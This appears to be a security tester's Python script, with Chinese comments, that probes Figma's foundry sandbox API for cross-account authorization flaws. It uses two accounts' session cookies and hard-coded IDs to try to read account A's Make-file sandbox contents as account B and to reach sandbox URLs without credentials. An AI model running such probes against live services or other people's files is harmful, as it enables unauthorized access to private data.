"""foundry 补测: 补全 _foundry_authz.py 的三个盲区
盲区1: r2(B+A_MAKE sandbox 200) 的 sboxdUrl 被丢弃从未解析测试
盲区2: 验证3 测错对象(B 读 A 的 sandbox 必然 400), 正确路径是 B 读自己创建的 sandbox 内容
盲区3: sboxdUrl / app url 本身从未被直接 HTTP 访问(URL 即凭证测试)

前置检查: A_MAKE 是否公开分享(公开性五问) —— 决定后续测试是否有意义
目标结果: B 的 sandbox 内容包含 A 的 Make 文件数据 / sboxdUrl 匿名可访问(非公开数据泄露)
"""
import io, json, urllib.request, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
CK_A = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_F2 = "qzDqStIDJyGbthpKiuvfwg"

def call(label, path, body=None, method="POST", file_key=None, ck=None, uid=None,
         host="https://www.figma.com", timeout=30, raw=False):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json",
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web"}
    if ck: hdrs["Cookie"] = ck
    if uid: hdrs["X-Figma-User-ID"] = uid
    if file_key: hdrs["X-Figma-File-Key"] = file_key
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(host + path, data=data, headers=hdrs, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        resp = r.read().decode(errors='replace')
        print(f"[{label}] {r.status}  {len(resp)}B")
        return resp if raw else None
    except urllib.error.HTTPError as e:
        resp = e.read().decode(errors='replace')
        print(f"[{label}] {e.code}  {resp[:300]}")
        return resp if raw else None
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:100]}")
        return None

print("======== 步骤0: cookie 有效性(B+A私有文件 sandbox 预期 403=有效, 401=失效) ========")
call("cookie检查 B+A_F2", "/api/cortex/foundry/sandbox", {}, file_key=A_F2, ck=CK_B, uid=B_UID)

print("\n======== 步骤1: 公开性检查 A_MAKE (5zb5YkoxMa09KpqOyuLcHD) ========")
call("匿名 GET /file/A_MAKE", "/file/" + A_MAKE, method="GET", ck=None)
call("B会话 GET /file/A_MAKE", "/file/" + A_MAKE, method="GET", ck=CK_B, uid=B_UID)

print("\n======== 步骤2: B + A_MAKE sandbox → 解析 B 自己的 sboxdUrl (盲区1补全) ========")
r2 = call("B+A_MAKE sandbox", "/api/cortex/foundry/sandbox", {},
          file_key=A_MAKE, ck=CK_B, uid=B_UID, raw=True)
b_sboxd = None
b_appurl = None
if r2:
    try:
        j = json.loads(r2)
        b_sboxd = j.get("sboxdUrl")
        b_appurl = j.get("url")
        print("  B 的 sboxdUrl:", b_sboxd)
        print("  B 的 app url :", b_appurl)
    except Exception as e:
        print("  parse fail", e)

print("\n======== 步骤3: B 会话 fs-snapshot(B 自己的 sandbox, 读 A 的 Make 文件沙箱内容) ========")
if b_sboxd:
    snap = call("B snapshot(对A_MAKE)", "/api/cortex/foundry/fs-snapshot",
                {"sboxdUrl": b_sboxd, "path": ".", "options": {"listing": "recursive", "content": "none"}},
                file_key=A_MAKE, ck=CK_B, uid=B_UID, raw=True, timeout=40)
    if snap:
        paths = []
        for line in snap.splitlines():
            line = line.strip()
            if line.startswith("data: "):
                try:
                    ev = json.loads(line[6:])
                    p = ev.get("path")
                    if p:
                        paths.append(p)
                except Exception:
                    pass
        from collections import Counter
        cnt = Counter(paths)
        print(f"  事件总数: {len(paths)}, 去重路径数: {len(cnt)}")
        for p, c in list(cnt.items())[:60]:
            print(f"    {p}  x{c}")
        # 找 code 目录下的完整路径
        code_paths = [p for p in cnt if p.startswith("code")]
        print(f"  code 下路径数: {len(code_paths)}")
        for p in code_paths[:30]:
            print(f"    {p}")

print("\n======== 步骤4: B fs-read-file 读 sandbox 具体文件 (按步骤3结果取路径, 不猜) ========")
if b_sboxd:
    # 先读 package.json(沙箱必有, 之前公开文件沙箱验证过此路径存在)
    call("B read package.json", "/api/cortex/foundry/fs-read-file",
         {"sboxdUrl": b_sboxd, "path": "package.json"},
         file_key=A_MAKE, ck=CK_B, uid=B_UID, raw=False, timeout=20)

print("\n======== 步骤5: URL 即凭证 —— 无 cookie 直连 sboxdUrl / app url (盲区3) ========")
if b_sboxd:
    call("匿名 GET sboxdUrl /", "/", method="GET", ck=None, host=b_sboxd, timeout=15)
    call("匿名 POST sboxdUrl /api/fs/snapshot", "/api/fs/snapshot",
         {"path": "."}, ck=None, host=b_sboxd, timeout=15)
if b_appurl:
    call("匿名 GET app url /", "/", method="GET", ck=None, host=b_appurl, timeout=15)

print("\n======== 步骤6: B 会话直连 sboxdUrl(带 cookie, 看是否鉴权差异) ========")
if b_sboxd:
    call("B cookie GET sboxdUrl /", "/", method="GET", ck=CK_B, uid=B_UID, host=b_sboxd, timeout=15)
